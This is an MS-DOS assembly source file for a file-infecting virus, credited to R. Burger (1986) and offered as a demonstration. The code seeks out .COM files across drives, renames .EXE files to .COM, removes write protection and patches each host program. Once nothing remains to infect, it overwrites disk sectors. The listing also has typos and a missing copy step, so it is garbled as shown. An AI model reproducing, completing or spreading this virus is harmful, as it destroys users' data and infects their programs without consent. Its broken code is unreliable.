;                        Virus in Assembly Language
;                        --------------------------

;Most viruses out there have been written in assembly because assembly has the
;unique ability to bypass operating system security.
;Here is an example of a virus written under MS-DOS 2.1 and can obviously be
;compiled in the later versions. The article contains remarks so as to further
;explain the parts. Programmers may wish to delete those segments if desired.

;**************************************************
;   Program Virus        
;   Version 1.1
;   Writter : R. Burger
;   Created 1986
;   This is a demonstration program for computer 
;   viruses. It has the ability to replace itself.
;   and thereby modify other programs. Enjoy.
;**************************************************

Code   Segment
       Assume  CS:Code
progr  equ 100h
       ORG progr

;**************************************************
;   The three NOP's serve as the marker byte of the  
;   virus which allow it to identify a virus.
;**************************************************

MAIN:
       nop
       nop
       nop

;**************************************************
;   Initialize the pointers
;**************************************************

       mov ax,00
       mov es:[pointer],ax
       mov es:[counter],ax
       mov es:[disks],al

;**************************************************
;   Get the selected drive
;**************************************************

       mov ah,19h             ;drive?
       int 21h    

;**************************************************
;   Get the current path on the current drive
;**************************************************

       mov cs:drive,al        ;save drive
       mov ah,47h             ;dir?
       mov dh,0               
       add al,1
       mov dl,al              ;in actual drive
       lea si,cs:old_path     ;
       int 21h

;**************************************************
;   Get the number of drives present. If only one   
;   is present, the pointer for the search order
;   will be set to serach order + 6
;**************************************************

       mov as,0eh             ;how many disks 
       mov dl,0               ;
       int 21h

       mov al,01
       cmp al,01              ;one drive
       jnz hups3
       mov al,06
       
hups3: mov ah,0
       lea bx,search_order
       add bx,ax
       add bx,0001h
       mov cs:pointer,bx
       clc

;**************************************************
;   Carry is set, if no more .COM's are found.      
;   Then, to avoid unnecessary work, .EXE files will
;   be renamed to .COM files and infected.
;   This causes the error message "Program to large
;   to fit memory" when starting larger infected
;   EXE programs.
;*************************************************

change_disk:
      jnc no_name_change
      mov ah,17h              ;change .EXE to .COM
      lea dx,cs:maske_exe
      int 21h
      cmp al,0ffh
      jnz no_name_change      ;.EXE found?

;****************************************************
;   If neither  .COM nor .EXE is found then sectors
;   will be overwritten depending on the system time
;   in milliseconds. This is the time of the complete
;   "infection" of a storage medium. The virus can
;   find nothing more to infect and starts its destruction
;*****************************************************   

      mov ah,2ch              ; read system clock
      int 21h
      mov bx,cs:pointer
      mov al,cs:[bx]
      mov bx,dx
      mov cx,2
      mov dh,0
      int 26h                 ; write crap on disk

;******************************************************
;   Check if the end of the search order table has been
;   reached . If so, end.
;******************************************************

no_name_change:
      mov bx,cs:pointer
      dec bx
      mov cs:pointer,bx
      mov dl,cs:[bx]
      cmp dl,0ffh
      jnz hups2
      jmp hops
      
;****************************************************
;   Get new drive from the search order table and
;   select it .
;***************************************************

hups2:
      mov ah,0eh
      int 21h                    ;change disk

;***************************************************
;   Start in the root directory
;***************************************************  

      mov ah,3bh                 ;change path
      lea dx,path
      int 21h
      jmp find_first_file

;**************************************************
;   Starting from the root, search for the first
;   subdir. FIrst convert all .EXE files to .COM
;   in the old directory
;**************************************************

find_first_subdir:
      mov ah,17h                 ;change .exe to .com
      lea dx,cs:maske_exe
      int 21h
      mov ah,3bh                 ;use root directory
      lea dx,path
      int 21h
      mov ah,04eh                ;search for first subdirectory
      mov cx,00010001b           ;dir mask
      lea dx,maske_dir           ;
      int 21h                    ;
      jc change_disk
      mov bx,CS:counter
      INC,BX
      DEC bx
      jz  use_next_subdir

;*************************************************
;   Search for the next subdirectory. If no more
;   directories are found, the drive will be changed.
;*************************************************

find_next_subdir:
      mov ah,4fh               ; search for next subdir
      int 21h 
      jc change_disk
      dec bx
      jnz find_next_subdir

;*************************************************
;   Select found directory.
;**************************************************

use_next_subdir:      
      mov ah,2fh               ;get dta address
      int 21h
      add bx,1ch
      mov es:[bx],'\`          ;address of name in dta
      inc bx
      push ds
      mov ax,es
      mov ds,ax
      mov dx,bx
      mov ah,3bh               ;change path
      int 21h
      pop ds
      mov bx,cs:counter
      inc bx
      mov CS:counter,bx

;**************************************************
;    Find first .COM file in the current directory.
;    If there are none, search the next directory.
;**************************************************

find_first_file:
      mov ah,04eh              ;Search for first
      mov cx,00000001b         ;mask
      lea dx,maske_com         ;
      int 21h                  ;
      jc find_first_subdir
      jmp check_if_ill

;**************************************************
;   If program is ill(infected) then search for
;   another other.
;************************************************** 

find_next_file:
      mov ah,4fh               ;search for next
      int 21h
      jc find_first_subdir

;*************************************************
;   Check is already infected by virus.
;**************************************************

check_if_ill:
      mov ah,3dh              ;open channel
      mov al,02h              ;read/write
      mov dx,9eh              ;address of name in dta 
      int 21
      mov bx,ax               ;save channel
      mov ah,3fh              ; read file
      mov ch,buflen           ;
      mov dx,buffer           ;write in buffer
      int 21h 
      mov ah,3eh              ;close file
      int 21h  

;***************************************************
;   This routine will search the three NOP's(no 
;   operation).If present there is already an infection.
;   We must then continue the search
;****************************************************

     mov bx,cs:[buffer]
     cmp bx,9090h
     jz find_next_file

;***************************************************
;   This routine will BY PASS MS-DOS WRITE PROTECTION
;   if present. Very important !
;***************************************************

     mov ah,43h               ;write enable
     mov al,0          
     mov dx,9eh               ;address of name in dta
     int 21h 
     mov ah,43h
     mov al,01h
     and cx,11111110b
     int 21h

;****************************************************
;   Open file for read/write access.
;*****************************************************

     mov ah,3dh               ;open channel
     mov al,02h               ;read/write
     mov dx,9eh               ;address of name in dta
     int 21h

;****************************************************
;   Read date entry of program and save for future
;   use.
;****************************************************

    mov bx,ax                ;channel
    mov ah,57h               ;get date
    mov al.0
    int 21h
    push cx                  ;save date
    push dx 

;****************************************************
;   The jump located at address 0100h of the program
;   will be saved for further use.
;*****************************************************

    mov dx,cs:[conta]        ;save old jmp
    mov cs:[jmpbuf],dx
    mov dx,cs:[buffer+1]     ;save new jump
    lea cx,cont-100h
    sub dx,cx
    mov cs:[conta],dx

;***************************************************** 
;   The virus copies itself to the start of the file. 
;***************************************************** 

    mov ah,57h               ;write date
    mov al,1         
    pop dx
    pop cx                   ;restore date
    int 21h

;*****************************************************
;   Close the file.
;*****************************************************

    mov ah,3eh               ;close file
    int 21h

;*****************************************************
;   Restore the old jump address. The virus saves at
;   address "conta" the jump which was at the start of
;   the host program.
;   This is done to preserve the executability of the
;   host program as much as possible.
;   After saving it still works with the jump address
;   contained in the virus. The jump address in the 
;   virus differs from the jump address in memory.
;****************************************************

    mov dx,cs:[jmpbuf]       ;restore old jump
    mov cs:[conta],dx
hops:  nop
       call use_old

;****************************************************
;   Continue with the host program.
;****************************************************
    
cont    db 0e9h                ;make jump
conta   dw 0
        mov ah,00
        int 21h    

;***************************************************
;   Reactivate the selected drive at the start of  
;   the program.
;***************************************************
 
use_old:
        mov ah,0eh             ;use old drive
        mov dl,cs:drive 
        int 21h 

;*************************************************** 
;    Reactivate the selected path at the start of
;    the program.
;***************************************************

        mov ah,3bh             ;use old drive
        lea dx,old_path-1      ;get old path and backslash
        int 21h
        ret

search_order db 0ffh,1,0,2,3,0ffh,00,offh
pointer      dw   0000           ;pointer f. search order
counter      dw   0000           ;counter f. nth. search 
disks        db    0             ;number of disks

maske_com    db "*.com",00       ;search for com files
maske_dir    db "*",00           ;search for dir's
maske_exe    db offh,0,0,0,0,0,00111111b 
             db 0,"????????exe",0,0,0,0
             db 0,"????????com",0
maske_all    db offh,0,0,0,0,0,00111111b
             db 0,"???????????",0,0,0,0
             db 0,"????????com",0

buffer equ 0e00h                 ;a safe place

buflen equ 230h                  ;lenght of virus!!!!
                                 ;carefull
                                 ;if changing!!!!
jmpbuf equ buffer+buflen         ;a safe place for jmp
path  db "\",0                   ;first place
drive db 0                       ;actual drive
back_slash db "\"
old_path db 32 dup (?)           ;old path

code ends

end main

;[ END OF THIS VIRUS PROGRAM ]
